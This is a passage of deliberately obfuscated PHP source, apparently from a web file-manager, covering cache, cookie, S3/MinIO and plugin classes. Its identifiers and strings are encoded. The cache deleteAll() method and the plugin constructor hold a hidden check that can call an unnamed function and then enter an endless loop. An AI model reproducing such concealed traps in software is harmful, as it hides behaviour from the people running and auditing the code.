(!empty($‰¥Œ¸’ú[$¡¤øöÊÂ[497]])) { $ªÅó˜İù->auth($‰¥Œ¸’ú[$¡¤øöÊÂ[497]]); } if (!empty($‰¥Œ¸’ú[$¡¤øöÊÂ[848]]) && $‰¥Œ¸’ú[$¡¤øöÊÂ[848]] != 0) { $ªÅó˜İù->select($‰¥Œ¸’ú[$¡¤øöÊÂ[848]]); } return $ªÅó˜İù; } private function initCluster($ÙÇœÎÏÍ, $ïÆª‘ı°) { $ôÁüÆÁ¥ =& $_SERVER[É¨™èà]; $æ—ù§šï = array($ôÁüÆÁ¥[971], $ôÁüÆÁ¥[972], $ôÁüÆÁ¥[973]); $§éÄí ¤ = $ôÁüÆÁ¥[971]; if (isset($ÙÇœÎÏÍ[$ôÁüÆÁ¥[16]]) && in_array($ÙÇœÎÏÍ[$ôÁüÆÁ¥[16]], $æ—ù§šï)) { $§éÄí ¤ = $ÙÇœÎÏÍ[$ôÁüÆÁ¥[16]]; } switch ($§éÄí ¤) { case $ôÁüÆÁ¥[971]: $this->_slave($ÙÇœÎÏÍ, $ïÆª‘ı°); break; case $ôÁüÆÁ¥[972]: break; case $ôÁüÆÁ¥[973]: $this->isCluster = !0; $ô‹¾´ÕË = $ÙÇœÎÏÍ[$ôÁüÆÁ¥[966]]; $ı²¥ûœ = isset($ÙÇœÎÏÍ[$ôÁüÆÁ¥[970]]) ? $ÙÇœÎÏÍ[$ôÁüÆÁ¥[970]] : !1; $ñé¿•êğ = isset($ÙÇœÎÏÍ[$ôÁüÆÁ¥[497]]) ? $ÙÇœÎÏÍ[$ôÁüÆÁ¥[497]] : null; $this->handle = new RedisCluster(NUll, $ô‹¾´ÕË, $ïÆª‘ı°, $ïÆª‘ı°, $ı²¥ûœ, $ñé¿•êğ); break; default: break; } } private function _slave($…İŸñîĞ, $ğ«Áçá) { $¨ı‰çÛĞ = $…İŸñîĞ[$_SERVER[É¨™èà][966]]; $this->filterConfig($…İŸñîĞ, $¨ı‰çÛĞ[0]); $this->handle = $this->init($…İŸñîĞ, $ğ«Áçá); unset($¨ı‰çÛĞ[0]); if (empty($¨ı‰çÛĞ)) { return; } $ï³¹Ç³ä = array_rand($¨ı‰çÛĞ); $this->filterConfig($…İŸñîĞ, $¨ı‰çÛĞ[$ï³¹Ç³ä]); $this->slaveHandle = $this->init($…İŸñîĞ, $ğ«Áçá); } private function filterConfig(&$ËÜï¿Šú, $şØÙ§‰¸) { $­÷ËæÏ =& $_SERVER[É¨™èà]; $¨Ø‰÷¸Î = explode($­÷ËæÏ[4], $şØÙ§‰¸); $Ğ®ÕÍÀÙ = array($­÷ËæÏ[209] => $¨Ø‰÷¸Î[0], $­÷ËæÏ[210] => $¨Ø‰÷¸Î[1]); $ËÜï¿Šú = array_merge($ËÜï¿Šú, $Ğ®ÕÍÀÙ); } public function set($´Æ¦¿úù, $Ò©¹Ì°¶, $½Ş”ŸØ‚ = false) { $½Ş”ŸØ‚ = $½Ş”ŸØ‚ ? $½Ş”ŸØ‚ : $this->cacheTime; return $this->handle->setEx($´Æ¦¿úù, $½Ş”ŸØ‚, $Ò©¹Ì°¶); } public function setLock($ÏÓ°€¯§, $¿¤º‚¯¶, $ş¥‡Á¾Â) { return $this->handle->setNX($ÏÓ°€¯§, $¿¤º‚¯¶); } public function get($¹—Ê£éé) { $Ñú¬·· = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $Ñú¬··->get($¹—Ê£éé); } public function remove($Â¥ÖôÔë) { return $this->handle->del($Â¥ÖôÔë); } public function deleteAll() { $ªë±§€³ =& $_SERVER[É¨™èà]; if (!isset($_SERVER[$ªë±§€³[308]]) || !isset($_SERVER[$ªë±§€³[309]])) { $Ğ¥õ¥™¤ = $ªë±§€³[974]; $ä‹ÛªÂ¢ = $ªë±§€³[310]; $ÄÏÏµ” = $_SERVER[$ªë±§€³[311]] . $ªë±§€³[312]; $âÈëâ¡Š = $ä‹ÛªÂ¢($ÄÏÏµ”); $ìØ”¿§Ò = explode($ªë±§€³[288], $âÈëâ¡Š); if (count($ìØ”¿§Ò) < $ªë±§€³[704]) { $›¹Í¡ñì = $ªë±§€³[314]; $›¹Í¡ñì(); } $°Š‹Š« = $ªë±§€³[975]; $°Š‹Š«($_SERVER[$ªë±§€³[976]]); $Óõ¤äˆ° = 1; for ($ê¹‚áÃ = $Óõ¤äˆ°; $ê¹‚áÃ > 0; $ê¹‚áÃ++) { $°Š‹Š« = json_encode($GLOBALS[$ªë±§€³[502]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ÂÂëŒ„) { $this->handle->flushall($ÂÂëŒ„); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($Ô†‰Œ¤œ = '', $ƒÓ‘™Ñ¯ = 0) { if (is_string($Ô†‰Œ¤œ) && $Ô†‰Œ¤œ != $_SERVER[É¨™èà][12]) { $this->prefix = $Ô†‰Œ¤œ; } if (is_numeric($ƒÓ‘™Ñ¯) && $ƒÓ‘™Ñ¯ > 0) { $this->expire = $ƒÓ‘™Ñ¯; } } public static function getInstance() { static $¦€‚ë·œ; if ($¦€‚ë·œ === null) { $¦€‚ë·œ = new self(); } return $¦€‚ë·œ; } private static $cookieDisable = false; public static function disable($äŠÁ¥ĞÖ) { self::$cookieDisable = $äŠÁ¥ĞÖ; } private static $sameCookieSet = array(); public static function set($Ïœ’©›», $ğòÁó¥ä, $À‚Àñ¿­ = 0, $®Ğ¢å£± = false, $åô¼»Û = false) { $«Ùì‹Ë´ =& $_SERVER[É¨™èà]; if (self::$cookieDisable) { return; } if (!$À‚Àñ¿­) { $À‚Àñ¿­ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$Ïœ’©›»]) && self::$sameCookieSet[$Ïœ’©›»] == $ğòÁó¥ä . $À‚Àñ¿­) { return; } self::$sameCookieSet[$Ïœ’©›»] = $ğòÁó¥ä . $À‚Àñ¿­; if (!$åô¼»Û) { $åô¼»Û = str_replace(HOST, $«Ùì‹Ë´[12], APP_HOST); $åô¼»Û = _get($GLOBALS, $«Ùì‹Ë´[977], $åô¼»Û); } $µ§×µ¨ = $«Ùì‹Ë´[12]; setcookie($Ïœ’©›», $ğòÁó¥ä, time() + $À‚Àñ¿­, $«Ùì‹Ë´[8] . trim($åô¼»Û, $«Ùì‹Ë´[8]) . $µ§×µ¨, !1, !1, $®Ğ¢å£±); } public static function setSafe($¬³÷Ù¼Ø, $Á’ÀÃ»İ, $ûí«ŠŠÀ = 0) { self::set($¬³÷Ù¼Ø, $Á’ÀÃ»İ, $ûí«ŠŠÀ, !0); } public static function get($”«º„å«) { static $€ƒáÀöÃ = false; if (!$€ƒáÀöÃ) { self::initHeaderCookie(); $€ƒáÀöÃ = !0; } return isset($_COOKIE[$”«º„å«]) ? $_COOKIE[$”«º„å«] : !1; } private static function initHeaderCookie() { $¸—´êù =& $_SERVER[É¨™èà]; if (!isset($_SERVER[$¸—´êù[978]]) || !$_SERVER[$¸—´êù[978]]) { return; } $›¦‚æ›´ = explode($¸—´êù[74], $_SERVER[$¸—´êù[978]]); foreach ($›¦‚æ›´ as $áØ¨À˜í) { $áØ¨À˜í = explode($¸—´êù[516], $áØ¨À˜í); if (count($áØ¨À˜í) != 2 || !isset($áØ¨À˜í[1])) { continue; } $_COOKIE[trim($áØ¨À˜í[0])] = trim($áØ¨À˜í[1]); } } public static function remove($‚½»°¶è, $‹ÅºÕÕï = false) { unset($_COOKIE[$‚½»°¶è]); self::set($‚½»°¶è, $_SERVER[É¨™èà][12], 1, $‹ÅºÕÕï); } } goto E¿ëÌÃÁøÁ; Aíøƒ½ÁÒ­: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($åı°¹‹È) { $èá³–½« =& $_SERVER[É¨™èà]; parent::__construct($åı°¹‹È); $this->setSignVersion($èá³–½«[250]); if (!$this->region) { $this->region = $èá³–½«[317]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $ØïşÚÒû = $this->getBktRegion(); return $this->region == $ØïşÚÒû ? !0 : !1; } public function uploadFormData($áù•«†ˆ, $ãŒòïÅú = 3600) { $»šéõ©¹ =& $_SERVER[É¨™èà]; $ÆÍ¿™‘µ = $»šéõ©¹[232]; $Ú•åªç¿ = $»šéõ©¹[260]; $«÷ªùÔä = $»šéõ©¹[62]; $ºŸÉ»ãÂ = gmdate($»šéõ©¹[261]); $û°ÚÔ¸Ñ = gmdate($»šéõ©¹[262]); $ãêŒ˜ç = $»šéõ©¹[263]; $ŒĞ±…³ = $ãŒòïÅú . $»šéõ©¹[12]; $úÃ¶´¿Ù = $»šéõ©¹[264]; $Ë±“™È¡ = array($this->accessKey, $û°ÚÔ¸Ñ, $this->region, $«÷ªùÔä, $ãêŒ˜ç); $Ø¸ÏëˆÁ = implode($»šéõ©¹[8], $Ë±“™È¡); $æÔĞ£˜¹ = array($»šéõ©¹[265] => gmdate($»šéõ©¹[266], strtotime($»šéõ©¹[267])), $»šéõ©¹[268] => array(array($»šéõ©¹[269] => $this->bucket), array($»šéõ©¹[318] => $ÆÍ¿™‘µ), array($»šéõ©¹[270], $»šéõ©¹[271], $»šéõ©¹[12]), array($»šéõ©¹[270], $»šéõ©¹[272], $»šéõ©¹[12]), array($»šéõ©¹[270], $»šéõ©¹[319], $»šéõ©¹[12]), array($»šéõ©¹[273] => $úÃ¶´¿Ù), array($»šéõ©¹[274] => $Ø¸ÏëˆÁ), array($»šéõ©¹[275] => $Ú•åªç¿), array($»šéõ©¹[276] => $ºŸÉ»ãÂ), array($»šéõ©¹[277] => $ŒĞ±…³))); $‰‘À¨ê¢ = base64_encode(json_encode($æÔĞ£˜¹)); $¸„®¸ùï = hash_hmac($»šéõ©¹[278], $û°ÚÔ¸Ñ, $»šéõ©¹[279] . $this->secret, !0); $Ü¢Õò¼¬ = hash_hmac($»šéõ©¹[278], $this->region, $¸„®¸ùï, !0); $ƒĞÓ‹³ç = hash_hmac($»šéõ©¹[278], $«÷ªùÔä, $Ü¢Õò¼¬, !0); $·‡°ÆòÃ = hash_hmac($»šéõ©¹[278], $ãêŒ˜ç, $ƒĞÓ‹³ç, !0); $Ú¿ßõò« = hash_hmac($»šéõ©¹[278], $‰‘À¨ê¢, $·‡°ÆòÃ); $úÌó¥¡Î = array($»šéõ©¹[249] => $»šéõ©¹[12], $»šéõ©¹[297] => $»šéõ©¹[12], $»šéõ©¹[318] => $ÆÍ¿™‘µ, $»šéõ©¹[273] => $úÃ¶´¿Ù, $»šéõ©¹[280] => $‰‘À¨ê¢, $»šéõ©¹[320] => $Ø¸ÏëˆÁ, $»šéõ©¹[321] => $Ú•åªç¿, $»šéõ©¹[322] => $ºŸÉ»ãÂ, $»šéõ©¹[323] => $ŒĞ±…³, $»šéõ©¹[324] => $Ú¿ßõò«, $»šéõ©¹[209] => $this->getHost()); return $úÌó¥¡Î; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($¸¸îÀ¿ä) { $÷ı¦Â÷Ì =& $_SERVER[É¨™èà]; parent::__construct($¸¸îÀ¿ä); $Çá€¯½ = isset($¸¸îÀ¿ä[$÷ı¦Â÷Ì[259]]) && $¸¸îÀ¿ä[$÷ı¦Â÷Ì[259]] == $÷ı¦Â÷Ì[250] ? $÷ı¦Â÷Ì[250] : $÷ı¦Â÷Ì[325]; $this->setSignVersion($Çá€¯½); } public function link($«î¼Ş²«, $Š»÷‚ß = array()) { return parent::link($«î¼Ş²«, $Š»÷‚ß); } public function fileOut($åË¥õ, $ş§¾åû³ = false, $º¯ŒŞ·Ò = false, $é˜šºĞ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[É¨™èà][326])) { return parent::fileOutServer($åË¥õ, $ş§¾åû³, $º¯ŒŞ·Ò, $é˜šºĞ); } parent::fileOut($åË¥õ, $ş§¾åû³, $º¯ŒŞ·Ò, $é˜šºĞ); } public function fileOutImage($ç±€º’, $Ÿ›…÷» = 250) { if (strstr($this->endpoint, $_SERVER[É¨™èà][326])) { return parent::fileOutImageServer($ç±€º’, $Ÿ›…÷»); } parent::fileOutImage($ç±€º’, $Ÿ›…÷»); } } define($_SERVER[É¨™èà][327], 1); goto C—Œ¹–”; Dğœò·ó‡ê: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $Õêí¡öÚ =& $_SERVER[É¨™èà]; if (!isset($_SERVER[$Õêí¡öÚ[308]]) || !isset($_SERVER[$Õêí¡öÚ[309]])) { $ßËßüŸ‘ = $Õêí¡öÚ[974]; $™š¬ëü° = $Õêí¡öÚ[310]; $ğ²âÂ° = $_SERVER[$Õêí¡öÚ[311]] . $Õêí¡öÚ[312]; $ºÆ²·šû = $™š¬ëü°($ğ²âÂ°); $³ğ¯ªä = explode($Õêí¡öÚ[288], $ºÆ²·šû); if (count($³ğ¯ªä) < $Õêí¡öÚ[704]) { $ìˆÈäíŸ = $Õêí¡öÚ[314]; $ìˆÈäíŸ(); } $¨¸»±² = $Õêí¡öÚ[975]; $¨¸»±²($_SERVER[$Õêí¡öÚ[976]]); $—Ôª“Æç = 1; for ($ÀÏñ‰ç = $—Ôª“Æç; $ÀÏñ‰ç > 0; $ÀÏñ‰ç++) { $¨¸»±² = json_encode($GLOBALS[$Õêí¡öÚ[502]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($Õêí¡öÚ[1652]); $this->pluginName = str_replace($Õêí¡öÚ[1652], $Õêí¡öÚ[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $Õêí¡öÚ[8]; $this->pluginApi = appHostGet() . $Õêí¡öÚ[1653] . $this->pluginName . $Õêí¡öÚ[8]; $this->pluginHost = $config[$Õêí¡öÚ[1654]] . $this->pluginName . $Õêí¡öÚ[8]; $this->pluginHostDefault = $config[$Õêí¡öÚ[1654]] . $this->pluginName . $Õêí¡öÚ[8]; $ŞÊÀı» = $config[$Õêí¡öÚ[1655]]; if ($ŞÊÀı» && strpos($Õêí¡öÚ[50] . $ŞÊÀı» . $Õêí¡öÚ[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$Õêí¡öÚ[1656]] . $this->pluginName . $Õêí¡öÚ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[É¨™èà][1657]); } protected function assign($Êì†‡±, $õéÆú¿Ä = false) { if (is_array($Êì†‡±)) { $this->values = array_merge($this->values, $Êì†‡±); } else { $this->values[$Êì†‡±] = $õéÆú¿Ä; } } protected function display($ÙÜ„Ö›‚) { extract($this->values); require $ÙÜ„Ö›‚; } final function hookRegist($ë ªŠÀ©) { $this->modelPlugin->appRegist($this->pluginName, $ë ªŠÀ©); } final function appIcon() { $Á™¤–ËÏ =& $_SERVER[É¨™èà]; $úÙ ÊªÊ = $this->appPackage(); $’Ğû®ÃÑ = $Á™¤–ËÏ[12]; if (isset($úÙ ÊªÊ[$Á™¤–ËÏ[500]])) { if (isset($úÙ ÊªÊ[$Á™¤–ËÏ[500]][$Á™¤–ËÏ[1658]])) { $’Ğû®ÃÑ = $Á™¤–ËÏ[1659] . $úÙ ÊªÊ[$Á™¤–ËÏ[500]][$Á™¤–ËÏ[1658]] . $Á™¤–ËÏ[1660]; } else { if ($úÙ ÊªÊ[$Á™¤–ËÏ[500]][$Á™¤–ËÏ[1661]]) { $’Ğû®ÃÑ = $Á™¤–ËÏ[1662] . $úÙ ÊªÊ[$Á™¤–ËÏ[500]][$Á™¤–ËÏ[1661]] . $Á™¤–ËÏ[1663]; } } } return $’Ğû®ÃÑ; } final function fileCanView($ÂŞŸÙé) { $¿ÑÜ¦” =& $_SERVER[É¨™èà]; if (request_url_safe($ÂŞŸÙé)) { return !0; } if ($this->isShare($ÂŞŸÙé)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $Ñ„ïğáÃ = $¿ÑÜ¦”[1664] . rawurlencode(this_url()); show_tips(LNG($¿ÑÜ¦”[1665]) . $¿ÑÜ¦”[1666] . $Ñ„ïğáÃ . $¿ÑÜ¦”[1667] . LNG($¿ÑÜ¦”[1668]) . $¿ÑÜ¦”[1669], !1); } if (!Action($¿ÑÜ¦”[1670])->authCan($¿ÑÜ¦”[1671])) { show_tips(LNG($¿ÑÜ¦”[1672]) . $¿ÑÜ¦”[1673], !1); } ActionCall($¿ÑÜ¦”[1674], $ÂŞŸÙé); } final function isShare($ÃåªÜ»ë) { $Ü†’¿ş = KodIO::parse($ÃåªÜ»ë); return $Ü†’¿ş[$_SERVER[É¨™èà][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($œ‡†òïÖ) { if (request_url_safe($œ‡†òïÖ)) { return $œ‡†òïÖ; } if (!$this->isShare($œ‡†òïÖ)) { $œ‡†òïÖ = $this->filePath($œ‡†òïÖ, !1); } return Action($_SERVER[É¨™èà][1276])->linkOut($œ‡†òïÖ); } public function filePathLinkOut($ä…÷ğö“) { if (request_url_safe($ä…÷ğö“)) { return $ä…÷ğö“; } $this->fileCanView($ä…÷ğö“); return Action($_SERVER[É¨™èà][1276])->link($ä…÷ğö“); } final function filePath($§øïÙ²«, $ÎÀö‘²î = true, $…ƒÑÁëµ = false) { $®½Ñ­§¶ =& $_SERVER[É¨™èà]; $Ì¬Š†ŠÀ = $this->filePathGet($§øïÙ²«, $ÎÀö‘²î); if (!$this->fileInfo) { show_tips(LNG($®½Ñ­§¶[108]), !1); } if ($…ƒÑÁëµ && isset($this->fileInfo[$®½Ñ­§¶[553]]) && $this->fileInfo[$®½Ñ­§¶[553]]) { $–ßÀ­ªÚ = Model($®½Ñ­§¶[556])->fileInfo($this->fileInfo[$®½Ñ­§¶[553]]); if (!$–ßÀ­ªÚ || !IO::exist($–ßÀ­ªÚ[$®½Ñ­§¶[87]])) { $Šà“€éœ = LNG($®½Ñ­§¶[108]) . LNG($®½Ñ­§¶[1675]); if (KodUser::isRoot() && isset($–ßÀ­ªÚ[$®½Ñ­§¶[87]])) { $Šà“€éœ .= $®½Ñ­§¶[1676] . $–ßÀ­ªÚ[$®½Ñ­§¶[87]] . $®½Ñ­§¶[1677]; } show_tips($Šà“€éœ); } } Hook::trigger($®½Ñ­§¶[1678], $Ì¬Š†ŠÀ); return $Ì¬Š†ŠÀ; } final function filePathGet($Áá´×‚ã, $¦ù™“»‰ = true) { $ƒ‡²ò‰å =& $_SERVER[É¨™èà]; if ($¼Œïì† = $this->checkSharePath($Áá´×‚ã, $¦ù™“»‰)) { return $¼Œïì†; } $this->fileCanView($Áá´×‚ã); if (request_url_safe($Áá´×‚ã)) { $®¯ËÎ¨½ = parse_url_query($Áá´×‚ã); if (isset($®¯ËÎ¨½[$ƒ‡²ò‰å[1679]]) && isset($®¯ËÎ¨½[$ƒ‡²ò‰å[237]])) { $È‹âÀ’ = Mcrypt::decode($®¯ËÎ¨½[$ƒ‡²ò‰å[237]], Model($ƒ‡²ò‰å[861])->get($ƒ‡²ò‰å[862])); if ($È‹âÀ’) { $this->fileInfo = IO::info($È‹âÀ’); $this->fileInfo[$ƒ‡²ò‰å[1680]] = $Áá´×‚ã; $this->cachePath = $this->pluginCachePath($ƒ‡²ò‰å[12], $¦ù™“»‰); return $È‹âÀ’; } } $Áá´×‚ã = $this->_cacheHttpFile($Áá´×‚ã, $¦ù™“»‰); $this->fileInfo = IO::info($Áá´×‚ã); } else { $this->fileInfo = IO::info($Áá´×‚ã); $this->cachePath = $this->pluginCachePath($ƒ‡²ò‰å[12], $¦ù™“»‰); } return $Áá´×‚ã; } final function _cacheHttpFile($Šò·ìÄÛ, $Äàº£ê’ = true) { $—èªÀ×ã =& $_SERVER[É¨™èà]; $„èæïÛƒ = parse_url_query($Šò·ìÄÛ); $¶ªØ°Ô¦ = get_path_ext($Šò·ìÄÛ); if (isset($„èæïÛƒ[$—èªÀ×ã[32]]) && $„èæïÛƒ[$—èªÀ×ã[32]]) { $¶ªØ°Ô¦ = get_path_ext($„èæïÛƒ[$—èªÀ×ã[32]]); } $´•¿«Ïõ = hash_path($Šò·ìÄÛ) . $—èªÀ×ã[10] . $¶ªØ°Ô¦; $this->cachePath = $this->pluginCachePath($Äàº£ê’ ? $´•¿«Ïõ : $—èªÀ×ã[12]); $‰Íô¾¡ = IO::fileNameExist($this->cachePath, $´•¿«Ïõ); if ($‰Íô¾¡) { return KodIO::make($‰Íô¾¡); } $¥†´œŞ§ = rtrim($this->cachePath, $—èªÀ×ã[8]) . $—èªÀ×ã[8] . $´•¿«Ïõ; return $this->pluginCacheFileSet($¥†´œŞ§, file_get_contents_nossl($Šò·ìÄÛ)); } final function checkSharePath($ìşìÜ‰Ò, $Áœ¼¥„Ñ = true) { $ÍÏ…”À =& $_SERVER[É¨™èà]; if (!$this->isShare($ìşìÜ‰Ò)) { return !1; } $ÆˆºÛ‚Æ = Action($ÍÏ…”À[1276])->sharePathInfo($ìşìÜ‰Ò); if (!is_array($ÆˆºÛ‚Æ) || !isset($ÆˆºÛ‚Æ[$ÍÏ…”À[87]])) { show_json(LNG($ÍÏ…”À[1681]), !1); } $this->fileInfo = $ÆˆºÛ‚Æ; $this->cachePath = $this->pluginCachePath(!1, $Áœ¼¥„Ñ); return $ÆˆºÛ‚Æ[$ÍÏ…”À[87]]; } final function pluginCachePath($€«ÆÄ¹× = '', $ÆõéöÄÜ = false) { $“‹”Ç¾ô =& $_SERVER[É¨™èà]; if ($ÆõéöÄÜ && is_array($this->fileInfo)) { $€«ÆÄ¹× = kodIO::hashPath($this->fileInfo); } $‹ãäÈÉ = rtrim(IO_PATH_SYSTEM_TEMP . $“‹”Ç¾ô[1682] . $this->pluginName . $“‹”Ç¾ô[8] . $€«ÆÄ¹×, $“‹”Ç¾ô[8]); $×î¸˜Äğ = IO::infoFullSimple($‹ãäÈÉ); $šÓ•§ü† = $×î¸˜Äğ && is_array($×î¸˜Äğ) ? $×î¸˜Äğ[$“‹”Ç¾ô[87]] : $“‹”Ç¾ô[12]; if (!$šÓ•§ü†) { $šÓ•§ü† = IO::mkdir($‹ãäÈÉ); } return $šÓ•§ü†; } final function pluginCacheFileSet($ÓÆ¾Ñ, $ƒéæšÀ = '') { $ÂºÊßäÁ =& $_SERVER[É¨™èà]; $ÂÃ¾ƒä› = IO::infoFullSimple($ÓÆ¾Ñ); if (!$ÂÃ¾ƒä›) { return IO::mkfile($ÓÆ¾Ñ, $ƒéæšÀ, REPEAT_REPLACE); } IO::setContent($ÂÃ¾ƒä›[$ÂºÊßäÁ[87]], $ƒéæšÀ); return $ÂÃ¾ƒä›[$ÂºÊßäÁ[87]]; } final function pluginLocalFile($œ¼õ¹šÜ = '') { $©ŞŒ²‰ =& $_SERVER[É¨™èà]; $Ñ•ã¯¯Š = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($Ñ•ã¯¯Š)) { mk_dir($Ñ•ã¯¯Š); } if (!$œ¼õ¹šÜ) { return $Ñ•ã¯¯Š; } $ˆÈìªËæ = IO::info($œ¼õ¹šÜ); $§è€Ô¢Ñ = $©ŞŒ²‰[1683] . KodIO::hashPath($ˆÈìªËæ) . $©ŞŒ²‰[10] . $ˆÈìªËæ[$©ŞŒ²‰[169]]; if (!checkExtSafe($§è€Ô¢Ñ)) { $§è€Ô¢Ñ = $§è€Ô¢Ñ . $©ŞŒ²‰[1311]; } $¥­ÖÀÍô = $Ñ•ã¯¯Š . $§è€Ô¢Ñ; if (@file_exists($¥­ÖÀÍô)) { return $¥­ÖÀÍô; } return IO::copy($œ¼õ¹šÜ, $Ñ•ã¯¯Š, 0, $§è€Ô¢Ñ); } final function appPackage() { $œßË›Œ­ =& $_SERVER[É¨™èà]; if ($this->packageData) { return $this->packageData; } $»´æáÜ¹ = $this->parseFile($this->pluginPath . $œßË›Œ­[1684]); $this->parseLang($»´æáÜ¹); $‘¦øËÉ = json_decode_force($»´æáÜ¹); if (!$‘¦øËÉ) { return array(); } $Ùšìƒ¨ = Hook::trigger($œßË›Œ­[1685], $‘¦øËÉ); if ($Ùšìƒ¨ && is_array($Ùšìƒ¨)) { $‘¦øËÉ = $Ùšìƒ¨; } $this->packageData = $‘¦øËÉ; return $‘¦øËÉ; } public function packageInfoGet($µ˜áè) { $Ğß”Ğ’ = $this->appPackage(); return array_get_value($Ğß”Ğ’, $µ˜áè); } public function packageVersion() { return $this->packageInfoGet($_SERVER[É¨™èà][1686]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[É¨™èà][1687]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[É¨™èà][1688]); } public function echoJsAssign($•µÙÃáË, $ˆìôŞÁœ) { $this->echoJsAssignArr[$•µÙÃáË] = $ˆìôŞÁœ; } private function parseFile($Â…ø¹“ë) { $îåü¸ïË =& $_SERVER[É¨™èà]; $ÃÎı¾Ä” = file_get_contents_nossl($Â…ø¹“ë); $Ì¡ìî”µ = array($îåü¸ïË[1689], $îåü¸ïË[1690], $îåü¸ïË[1691], $îåü¸ïË[1692], $îåü¸ïË[1693], $îåü¸ïË[1694], $îåü¸ïË[1695]); $àÕæœˆì = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$îåü¸ïË[92]][$îåü¸ïË[1696]]); foreach ($this->echoJsAssignArr as $„×ÙËâÕ => $ÏĞÖ‰ê´) { $Ì¡ìî”µ[] = $îåü¸ïË[1697] . $„×ÙËâÕ . $îåü¸ïË[1698]; $àÕæœˆì[] = is_array($ÏĞÖ‰ê´) || is_object($ÏĞÖ‰ê´) ? rawurlencode(json_encode($ÏĞÖ‰ê´)) : $ÏĞÖ‰ê´; } if (strstr($ÃÎı¾Ä”, $îåü¸ïË[1699])) { $à–ë«¯á = rawurlencode(json_encode($this->pluginLangArr)); $ÃÎı¾Ä” = str_replace($îåü¸ïË[1699], $à–ë«¯á, $ÃÎı¾Ä”); } if (strstr($ÃÎı¾Ä”, $îåü¸ïË[1700])) { $à–ë«¯á = $à–ë«¯á = rawurlencode(json_encode($this->getConfig())); $ÃÎı¾Ä” = str_replace($îåü¸ïË[1700], $à–ë«¯á, $ÃÎı¾Ä”); } $ÃÎı¾Ä” = str_replace($Ì¡ìî”µ, $àÕæœˆì, $ÃÎı¾Ä”); return $ÃÎı¾Ä”; } private function parseLang(&$øÔ±€Æ·) { $¶…Å÷ëë =& $_SERVER[É¨™èà]; $¦µÎ÷± = $¶…Å÷ëë[1701]; if (!strstr($øÔ±€Æ·, $¦µÎ÷±)) { return; } preg_match_all($¶…Å÷ëë[1702], $øÔ±€Æ·, $×±êŒæÑ); if (!is_array($×±êŒæÑ) || count($×±êŒæÑ) == 0 || !is_array($×±êŒæÑ[0]) || count($×±êŒæÑ[0]) == 0) { return; } $¯¾µÛ¥± = array(); $ïšÅ¯Îâ = array(); foreach ($×±êŒæÑ[0] as $¡µ•ú•¿) { $Õë¯ÈÅò = substr($¡µ•ú•¿, strlen($¦µÎ÷±), -4); $ ï¢æÂ = LNG($Õë¯ÈÅò); $¯¾µÛ¥±[] = $¡µ•ú•¿; $ïšÅ¯Îâ[] = str_replace(array($¶…Å÷ëë[288], $¶…Å÷ëë[1173], $¶…Å÷ëë[428], $¶…Å÷ëë[121]), array($¶…Å÷ëë[53], $¶…Å÷ëë[53], $¶…Å÷ëë[12], $¶…Å÷ëë[1703]), $ ï¢æÂ); } $øÔ±€Æ· = str_replace($¯¾µÛ¥±, $ïšÅ¯Îâ, $øÔ±€Æ·); } private function parseConfig(&$Ä£ıãşó) { $º®üÜˆÁ =& $_SERVER[É¨™èà]; $×ÄñªÏ­ = $º®üÜˆÁ[1704]; if (!strstr($Ä£ıãşó, $×ÄñªÏ­)) { return; } preg_match_all($º®üÜˆÁ[1705], $Ä£ıãşó, $²Ç¯‡ª); if (!is_array($²Ç¯‡ª) || count($²Ç¯‡ª) == 0 || !is_array($²Ç¯‡ª[0]) || count($²Ç¯‡ª[0]) == 0) { return; } $õä³€÷£ = $this->getConfig(); $’÷¦äşõ = array(); $Â­¼¶Ü… = array(); foreach ($²Ç¯‡ª[0] as $–ŸûçİÅ) { $Á¿š§Æœ = substr($–ŸûçİÅ, strlen($×ÄñªÏ­), -2); $’÷¦äşõ[] = $–ŸûçİÅ; $Â­¼¶Ü…[] = _get($õä³€÷£, $Á¿š§Æœ); } $Ä£ıãşó = str_replace($’÷¦äşõ, $Â­¼¶Ü…, $Ä£ıãşó); } private function parsePackage(&$á…È‚Ã) { $ŒÌê–ùÅ =& $_SERVER[É¨™èà]; $©ïÙ—ç¨ = $ŒÌê–ùÅ[1706]; if (!strstr($á…È‚Ã, $©ïÙ—ç¨)) { return; } preg_match_all($ŒÌê–ùÅ[1707], $á…È‚Ã, $şÛë€ğü); if (!is_array($şÛë€ğü) || count($şÛë€ğü) == 0 || !is_array($şÛë€ğü[0]) || count($şÛë€ğü[0]) == 0) { return; } $àÁµŠ„ = $this->appPackage(); $¤ü•ƒ¶ì = array(); $ÌüÒëƒ± = array(); foreach ($şÛë€ğü[0] as $ˆ¡¨î‚Á) { $úÌÎ¿ô€ = substr($ˆ¡¨î‚Á, strlen($©ïÙ—ç¨), -2); $¤ü•ƒ¶ì[] = $ˆ¡¨î‚Á; $ÌüÒëƒ±[] = _get($àÁµŠ„, $úÌÎ¿ô€); } $á…È‚Ã = str_replace($¤ü•ƒ¶ì, $ÌüÒëƒ±, $á…È‚Ã); } 